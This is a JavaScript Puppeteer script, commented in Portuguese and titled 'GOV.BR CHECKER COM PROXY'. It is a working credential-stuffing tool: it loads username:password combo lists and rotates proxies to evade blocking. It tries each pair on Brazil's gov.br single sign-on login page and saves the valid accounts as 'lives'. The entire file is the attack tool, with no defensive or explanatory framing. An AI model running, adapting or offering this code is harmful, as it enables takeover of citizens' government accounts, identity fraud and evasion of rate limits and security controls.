const fs = require("fs");
const puppeteer = require("puppeteer");

// Sistema de proxy simples
class ProxySystem {
    constructor() {
        this.proxies = [];
        this.currentIndex = 0;
    }
    
    carregarProxies() {
        try {
            if (fs.existsSync("proxies.txt")) {
                const data = fs.readFileSync("proxies.txt", "utf8");
                this.proxies = data.split('\n')
                    .map(p => p.trim())
                    .filter(p => p && !p.startsWith('#'));
                console.log(`📦 ${this.proxies.length} proxies carregados`);
            } else {
                console.log("⚠️  Arquivo proxies.txt não encontrado, usando conexão direta");
            }
        } catch (error) {
            console.log("⚠️  Erro ao carregar proxies, usando direto");
        }
        return this;
    }
    
    getProxy() {
        if (this.proxies.length === 0) return null;
        
        const proxy = this.proxies[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }
}

// Delay função (mantida igual)
async function delay(ms) {
    return new Promise(res => setTimeout(res, ms));
}

// Função principal de login com proxy
async function tentarLoginGovBR(usuario, senha, proxy = null) {
    const configNavegador = { 
        headless: true, 
        defaultViewport: null,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    };
    
    // Adiciona proxy se existir
    if (proxy) {
        configNavegador.args.push(`--proxy-server=${proxy}`);
        console.log(`🌐 Usando proxy: ${proxy}`);
    }
    
    const navegador = await puppeteer.launch(configNavegador);
    const page = await navegador.newPage();

    try {
        // Acessa página de login
        await page.goto("https://sso.acesso.gov.br/login", {
            waitUntil: "networkidle2",
            timeout: 60000
        });

        // Espera campo de usuário
        await page.waitForSelector("#accountId", { timeout: 15000 });
        
        // Preenche usuário
        await page.type("#accountId", usuario, { delay: 50 });
        await page.click("#enter-account");
        
        await delay(3000);
        
        // Verifica se campo de senha apareceu
        const senhaSelector = "#password";
        const senhaExiste = await page.$(senhaSelector).catch(() => null);
        
        if (!senhaExiste) {
            await navegador.close();
            return false; // Usuário inválido
        }
        
        // Preenche senha
        await page.type(senhaSelector, senha, { delay: 50 });
        await page.click("#enter-password");
        
        await delay(6000);
        
        // Verifica resultado
        const urlAtual = page.url();
        
        // Se ainda está na página de login, falhou
        if (urlAtual.includes("login") || urlAtual.includes("sso")) {
            await navegador.close();
            return false;
        }
        
        // Se redirecionou, provavelmente logou
        await navegador.close();
        return true;
        
    } catch (error) {
        await navegador.close();
        return false;
    }
}

// Sistema principal
(async () => {
    console.log("=".repeat(50));
    console.log("🔐 GOV.BR CHECKER COM PROXY");
    console.log("=".repeat(50));
    
    // Carrega proxies
    const proxySystem = new ProxySystem().carregarProxies();
    
    // Carrega combos
    if (!fs.existsSync("logs.txt")) {
        console.error("❌ Arquivo logs.txt não encontrado!");
        console.log("Crie um arquivo logs.txt com formato: usuario:senha");
        process.exit(1);
    }
    
    const logins = fs.readFileSync("logs.txt", "utf8")
        .split('\n')
        .filter(l => l.trim())
        .map(l => {
            const [usuario, senha] = l.split(':').map(s => s.trim());
            return { usuario, senha, original: l };
        })
        .filter(l => l.usuario && l.senha);
    
    console.log(`\n📦 ${logins.length} logins carregados`);
    console.log("⚡ Iniciando verificação...\n");
    
    // Cria arquivo de resultados
    const livesFile = "lives.txt";
    fs.writeFileSync(livesFile, "");
    
    let validoCount = 0;
    let testeCount = 0;
    
    // Testa cada login
    for (let cred of logins) {
        testeCount++;
        const { usuario, senha, original } = cred;
        
        console.log(`[${testeCount}/${logins.length}] Testando: ${usuario}`);
        
        // Pega proxy (se disponível)
        const proxy = proxySystem.getProxy();
        
        // Tenta fazer login
        const valido = await tentarLoginGovBR(usuario, senha, proxy);
        
        if (valido) {
            validoCount++;
            console.log(`   ✅ LIVE: ${usuario}:${senha}`);
            fs.appendFileSync(livesFile, `${original}\n`);
        } else {
            console.log(`   ❌ DIE: ${usuario}`);
        }
        
        // Delay para não sobrecarregar
        await delay(2000);
    }
    
    // Resultado final
    console.log("\n" + "=".repeat(50));
    console.log("🏁 VERIFICAÇÃO CONCLUÍDA");
    console.log("=".repeat(50));
    console.log(`✅ Logins válidos: ${validoCount}`);
    console.log(`❌ Logins inválidos: ${logins.length - validoCount}`);
    console.log(`💾 Lives salvos em: ${livesFile}`);
    console.log("");
    
    // Salva estatísticas simples
    const stats = {
        total: logins.length,
        lives: validoCount,
        dies: logins.length - validoCount,
        date: new Date().toISOString(),
        withProxy: proxySystem.proxies.length > 0
    };
    
    fs.writeFileSync("stats.json", JSON.stringify(stats, null, 2));
    console.log("📊 Estatísticas salvas em stats.json");
    
})();
